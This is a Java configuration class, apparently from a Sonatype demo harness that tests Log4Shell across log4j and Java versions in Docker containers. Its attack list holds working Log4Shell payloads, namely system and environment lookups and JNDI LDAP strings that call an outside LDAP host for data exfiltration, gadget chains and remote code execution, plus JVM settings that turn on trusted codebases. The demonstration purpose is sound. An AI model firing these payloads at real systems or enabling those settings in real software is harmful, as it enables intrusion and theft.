package com.sonatype.demo.log4shell.config;
import com.sonatype.demo.log4shell.*;
import com.sonatype.demo.log4shelldemo.helpers.DockerEnvironment;
import org.paukov.combinatorics3.Generator;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;


public class Configuration {


    private static final String fatjars = "-jar-with-dependencies.jar";
    public static final String ANYJAR = ".jar";


    private static final Logger log = LoggerFactory.getLogger(FrontEnd.class);

    private final ConfigMap<LogVersion> logVersions = new ConfigMap<>();
    private final Map<String,ConfigElement<LogVersion>> logVersionsByName  = new TreeMap<>(new DotArrayStringComparitor());

    private final ConfigMap<Attack> attacks = new ConfigMap<>();
    private final Map<Integer,Attack> attacksByID = new TreeMap<>();

    private final ConfigMap<JavaVersion> javaVersions = new ConfigMap<>();
    private final Map<String,JavaVersion> javaVersionsByName = new TreeMap<>();
    private final ConfigMap<SystemProperty> vmProperties = new ConfigMap<>();

    private final Set<String> reportingProperties=new HashSet<>();
    private final Set<String> hints=new HashSet<>();

    private String runnerPath;

    private final ConfigMap<String> configBinaryOptions=new ConfigMap<>();
    private int comboMode;
    private int silentMode;
    private int parallelMode;

    public static Configuration loadConfig(File config) throws Exception {

        Configuration c = new Configuration();
        c.loadJarPaths();
        c.loadJavaLevels(config);
        c.loadAttacks();
        c.loadHints(config);
        c.loadVMProperties();

        c.reportingProperties.add("java.version");

        c.comboMode= c.configBinaryOptions.addEntry("Generate property combinations").getID();
        c.silentMode= c.configBinaryOptions.addEntry("Run silent (no detailed data stored").getID();

        return c;
    }


    private void loadAttacks() {

        Attack a=Attack.buildAttack(AttackType.EXPOSE_JAVA_VERSION, "${sys:java.version}");
        a.addCheck(new AttackResult(ResultType.FAIL,AttackResult.ComparisionType.CONTAINS,"${sys:java.version}"));
        a.addCheck(AttackResult.SUCCEDED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.EXPOSE_JAVA_CLASSPATH, "${sys:java.class.path}");
        a.addCheck(new AttackResult(ResultType.FAIL,AttackResult.ComparisionType.CONTAINS,"${sys:java.class.path}"));
        a.addCheck(AttackResult.SUCCEDED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.EXPOSE_ENVVAR, "${env:MODE}");
        a.addCheck(new AttackResult(ResultType.FAIL,AttackResult.ComparisionType.CONTAINS,"${env:MODE}"));
        a.addCheck(AttackResult.SUCCEDED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.EXPOSE_LOG4J_CONFIG, "${log4j:configLocation}");
        a.addCheck(new AttackResult(ResultType.SUCCESS,AttackResult.ComparisionType.CONTAINS,"runner.jar"));
        a.addCheck(AttackResult.FAILED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.TRANSMIT_JAVA_VERSION, "${jndi:ldap://ldap.dev:1389/cn=version}");
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"sent us ${sys:java.version}"));
        a.addCheck(new AttackResult(ResultType.SUCCESS,AttackResult.ComparisionType.CONTAINS,"sent us "));
        a.addCheck(AttackResult.FAILED);
        addAttack(a);


        a=Attack.buildAttack(AttackType.GADGET_CHAIN, "${jndi:ldap://ldap.dev:1389/cn=gadget}");
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"cannot be cast"));
        a.addCheck(new AttackResult(ResultType.SUCCESS,AttackResult.ComparisionType.CONTAINS,"gadget-chain"));
        a.addCheck(AttackResult.FAILED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.RCE, "${jndi:ldap://ldap.dev:1389/cn=rce}");
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"cannot be cast"));
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"Reference Class Name:"));
        a.addCheck(new AttackResult(ResultType.SUCCESS,AttackResult.ComparisionType.CONTAINS,"XXX"));
        a.addCheck(AttackResult.FAILED);
        addAttack(a);

        a=Attack.buildAttack(AttackType.HIDDEN_ATTACK, "${jndi:ldap://ldap.dev:1389/a}");
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"cannot be cast"));
        a.addCheck(new AttackResult(ResultType.PARTIAL,AttackResult.ComparisionType.CONTAINS,"Reference Class Name:"));
        a.addCheck(new AttackResult(ResultType.SUCCESS,AttackResult.ComparisionType.CONTAINS,"thank you for your data"));
        a.addCheck(AttackResult.FAILED);
        addAttack(a);


    }


    private void addAttack(Attack a) {
        int id=attacks.addEntry(a).getID();
        attacksByID.put(id,a);
    }


    private void loadVMProperties() {
        SystemProperty p = new SystemProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        vmProperties.addEntry(p);
        p = new SystemProperty("com.sun.jndi.ldap.object.trustSerialData", "true");
        vmProperties.addEntry(p);
        p = new SystemProperty("log4j2.formatMsgNoLookups", "true");
        vmProperties.addEntry(p);

    }


    private void loadJavaLevels(File c) throws Exception {


        Set<String> localImages = DockerEnvironment.getLocalDockerImages();
        List<String> sorted = new LinkedList<>(localImages);
        sorted.sort(new DockerImageNameComparitor());

        File config = new File(c, "javalevels.txt");
        List<String> lines = Files.readAllLines(config.toPath());

        for (String s : lines) {
            s = s.trim();
            JavaVersion jv = new JavaVersion(s);
            if (localImages.contains(s)) {
                javaVersions.addEntry(jv);
                javaVersionsByName.put(s,jv);
            } else {
                log.warn("Specified Java Image {} is not present in local cache ", s);
            }
        }


    }



   private  void loadHints(File c) throws IOException {

        File hintsFile=new File(c,"hints.txt");
        if(!hintsFile.exists()) return;

        List<String> lines= Files.readAllLines(hintsFile.toPath());

        for(String s:lines) {
            s=s.trim();
            hints.add(s);
        }

    }

    private void loadJarPaths() throws IOException {

        File current = new File(System.getProperty("user.dir"));

        log.info("searching for log jars in {}", current.getAbsolutePath());
        File driver = new File(current, "driver");

        File log4jversions = new File(driver, "log4jversions");
        List<Path> candidates = getCandidates(log4jversions, fatjars);
        registerLog4JJars(current, candidates);

       File runner = new File(driver, "runner");
        candidates = getCandidates(runner, ANYJAR);
        if (candidates == null || candidates.isEmpty()) {
            throw new RuntimeException("no candidate log packages found - run 'mvn package' first");
        }
        Path r = candidates.get(0);
        log.info("candidate runner path {}", r);
        runnerPath = relLoc(current, r.toFile());
        log.info("runner path {}", runnerPath);

    }


    private String relLoc(File first, File second) {
        String a = first.getAbsolutePath();
        String b = second.getAbsolutePath();
        String rel = b.substring(a.length());
        if (rel.startsWith("/")) rel = rel.substring(1);
        return rel;
    }

    private void registerLog4JJars(File current, List<Path> candidates) {


        for (Path p : candidates) {
            p = p.toAbsolutePath();
            File f = p.toFile();
            String name = f.getName();
            String version = name.substring(0, name.length() - fatjars.length());

            LogVersion lv = new LogVersion(version, relLoc(current, f));
            ConfigElement<LogVersion> entry=logVersions.addEntry(lv);
            logVersionsByName.put(lv.getVersion(), entry);

            log.info("log4j version {} = jar {}", version, lv.getVersion());

        }
    }

    private List<Path> getCandidates(File local, String suffix) throws IOException {
        List<Path> candidates;
        Path path = local.toPath();
        try (Stream<Path> pathStream = Files.find(path,
                Integer.MAX_VALUE,
                (p, basicFileAttributes) ->
                        p.getFileName().toString().toLowerCase().endsWith(suffix))
        ) {
            candidates = pathStream.collect(Collectors.toList());
        }
        return candidates;
    }

    public String getRunnerPath() {
        return runnerPath;
    }



    public List<LogVersion> getActiveLogVersions() {
      return logVersions.getActive();
    }

    public List<ConfigElement<Attack>> getActiveAttacks() {
        return attacks.getActiveElements();
    }

   // public Collection<ConfigElement<LogVersion>> getAllLogVersions() {return logVersions.values();}

    public Collection<ConfigElement<SystemProperty>> getAllVMProperties() {
        return vmProperties.values();
    }

    public Collection<ConfigElement<JavaVersion>> getAllJavaVersions() {
        return javaVersions.values();
    }

    public String[] getSpecialistConsoleNames() {
        return new String[]{"ldap","dns"};
    }

    public Set<String> getHints() {
        return Collections.unmodifiableSet(hints);
    }

    public Collection<ConfigElement<Attack>> getAllAttacks() {
        return attacks.values();
    }



    public boolean toggleOption(int id) { return  configBinaryOptions.toggle(id); }

    public boolean toggleVersion(int id) { return  logVersions.toggle(id);}

    public boolean  toggleJavaVersion(int id) { return javaVersions.toggle(id);}

    public boolean  toggleAttack(int id) {
        return attacks.toggle(id);
    }

    public boolean toggleProperty(int property) {
        return vmProperties.toggle(property);
    }

    public JavaVersion getJavaVersion(String name) {
        return javaVersionsByName.get(name);
    }



    public List<ConfigElement<Attack>> getAdhocAttack(String payload) {
        Attack a=Attack.buildSimpleMutatedAttack(AttackType.ADHOC,payload);
        ConfigElement<Attack> ce=new ConfigElement<>(a,0);
        List<ConfigElement<Attack>> l=new LinkedList<>();
        l.add(ce);
        return l;

    }

    public Collection<String> getLogNames() {
        return logVersionsByName.keySet();
    }

    public ConfigElement<LogVersion> getLogVersion(String s) {
            return logVersionsByName.get(s);
    }

    public List<ConfigElement<LogVersion>> getOrderedLogVersions() {

        List<ConfigElement<LogVersion>> versions=new LinkedList<>();
        Collection<String> levelNames=getLogNames();

        for(String s:levelNames) {
            versions.add(getLogVersion(s));
        }
        return versions;

    }

    public Collection<ConfigElement<String>> getConfigOption() {
        return configBinaryOptions.values();
    }

    public boolean isSilentMode() {
        return configBinaryOptions.isActive(silentMode);
    }


    public class RunnerConfig {

        private final JavaVersion jv;
        public List<LogVersion> logVersions;
       private List<ConfigElement<SystemProperty>> vmprops;
        public List<ConfigElement<Attack>> attacks;
        private Set<Integer> activeVMProperties;


        public RunnerConfig(JavaVersion jv) {
            this.jv=jv;
        }

        public String getImageName() {
            return jv.version;
        }

        public Set<String> getReportingPropertyNames() {
          return Collections.unmodifiableSet(reportingProperties);
        }

        public boolean hasVMProperties() {
            return vmprops!=null && !vmprops.isEmpty();
        }

        public List<ConfigElement<SystemProperty>> getVMProperties() {
            return Collections.unmodifiableList(vmprops);
        }

        public List<LogVersion> getLogVersions() {
            return Collections.unmodifiableList(logVersions);
        }

        public boolean hasLogVersions() {
            return logVersions!=null && !logVersions.isEmpty();
        }

        public boolean hasAttacks() {
            return attacks!=null && !attacks.isEmpty();
        }

        public List<ConfigElement<Attack>> getAttacks() {
            return Collections.unmodifiableList(attacks);
        }

        public LogVersion getLogVersion(String v) {
            return logVersionsByName.get(v).getBase();
        }

        public JavaVersion getJavaVersion() {
            return jv;
        }

        public Attack getAttack(int attackID) {
            return attacksByID.get(attackID);
        }


        public Collection<ConfigElement<Attack>> getAllAttacks() {
            return Configuration.this.attacks.values();
        }

        public Set<Integer> getActiveVMProperties() {
            return activeVMProperties;
        }

		public boolean isComboMode() {
			return Configuration.this.isComboMode();		}


    }

    public void generateAttackConfigs(List<ConfigElement<Attack>> attacks,ConfigHandler h) {
        System.out.println("Generating attacks");
        System.out.println("Silent Mode="+isSilentMode());
        System.out.println("Combo  Mode="+isComboMode());


        for (JavaVersion jv : javaVersions.getActive()) {

            RunnerConfig rc = new RunnerConfig(jv);
            rc.activeVMProperties=vmProperties.getActiveIDs();
            rc.logVersions = getOrderedActiveLogVersions();
            rc.vmprops = vmProperties.getActiveElements();
            rc.attacks = attacks;
            h.handle(rc);
        }

    }



    public boolean isComboMode() {
        return configBinaryOptions.isActive(comboMode);
    }

    public void generateRunnerConfigs(List<ConfigElement<Attack>> attacks,ConfigHandler h) {

            // if in property combo mode we do all combinaions of active properties (inc empty set)
            // also disable any data storage other than the basics

            if(configBinaryOptions.isActive(comboMode)) {
                System.out.println("Generating property combination attack");
                Generator.subset(vmProperties.getActiveIDs())
                        .simple()
                        .stream()
                        .forEach(s -> buildConfig(s, attacks, h));
            } else {
                System.out.println("Generating attacks");
                System.out.println("Silent Mode="+isSilentMode());

                buildConfig(new LinkedList<>(vmProperties.getActiveIDs()),attacks,h);
            }

    }

    private void buildConfig(List<Integer> activeIDs,List<ConfigElement<Attack>> attacks, ConfigHandler h) {

        System.out.println("build config "+activeIDs);

        for (JavaVersion jv : javaVersions.getActive()) {
            RunnerConfig rc = new RunnerConfig(jv);
            rc.activeVMProperties=new HashSet<>(activeIDs);
            rc.logVersions = getOrderedActiveLogVersions();
            rc.vmprops = vmProperties.getActiveElements();
            rc.attacks = attacks;
           h.handle(rc);
        }
    }

    private List<LogVersion> getOrderedActiveLogVersions() {
        List<LogVersion> results=new LinkedList<>();
        for(ConfigElement<LogVersion> l:getOrderedLogVersions()) {
            if(l.isActive()) results.add(l.getBase());
        }
        return results;
    }

    private static class DotArrayStringComparitor   implements Comparator<String>{

        private static final String digits="0123456789";

        @Override
        public  int compare(String a,String b) {
            List<Object> o1bits = parse(a);
            List<Object> o2bits = parse(b);

          return DockerImageNameComparitor.compareVersions(o1bits, o2bits);
        }

        private List<Object> parse(String versions) {
            List<Object> l=new LinkedList<>();
            for(String v:versions.split("\\.")) {
                int i=0;
                char[] chars=v.toCharArray();
                for (char aChar : chars) {
                    int p = digits.indexOf(aChar);
                    if (p >= 0) {
                        i = i * 10;
                        i = i + p;
                    } else {
                        break;
                    }
                }
                l.add(i);

            }
            return l;
        }
    }

    private static class DockerImageNameComparitor implements Comparator<String> {

        private static final String digits="0123456789";
        @Override
        public int compare(String o1, String o2) {


            if (o1 == null && o2 == null) return 0;
            if (o1 == null) return 1;
            if (o2 == null) return -1;
            o1 = o1.trim();
            o2 = o2.trim();
            if (o1.equals(o2)) return 0;


            List<Object> o1bits = parse(o1);
            List<Object> o2bits = parse(o2);

           return compareVersions(o1bits, o2bits);

        }

        public static int compareVersions(List<Object> o1bits,List<Object> o2bits) {


            String name1=o1bits.remove(0).toString();
            String name2=o2bits.remove(0).toString();

            if(o1bits.size()>o2bits.size()) {
                pad(o2bits,o1bits.size());
            } else if(o2bits.size()> o1bits.size()) {
                pad(o1bits,o2bits.size());
            }

            int namecomp=name1.compareTo(name2);
            if(namecomp!=0) return namecomp;


            while(!o1bits.isEmpty() && !o2bits.isEmpty()) {

                Integer i1=(Integer)o1bits.remove(0);
                Integer i2=(Integer)o2bits.remove(0);
                namecomp=i1.compareTo(i2);
                if(namecomp!=0) return namecomp;
            }


            return 0;
        }

        private static void pad(List<Object> l, int size) {
            while(l.size()<size) {
                l.add(0);
            }
        }

        private List<Object> parse(String in) {
            List<Object> l=new LinkedList<>();
            int colon=in.indexOf(":");
            if(colon<0) {
                 // no version
                l.add(in);
                return l;
            }
            String name=in.substring(0,colon);
            l.add(name);
            String versions=in.substring(colon+1);
            for(String v:versions.split("\\.")) {
                int i=0;
                char[] chars=v.toCharArray();
                for (char aChar : chars) {
                    int p = digits.indexOf(aChar);
                    if (p >= 0) {
                        i = i * 10;
                        i = i + p;
                    } else {
                        break;
                    }
                }
                 l.add(i);

            }
            return l;
        }
    }


}

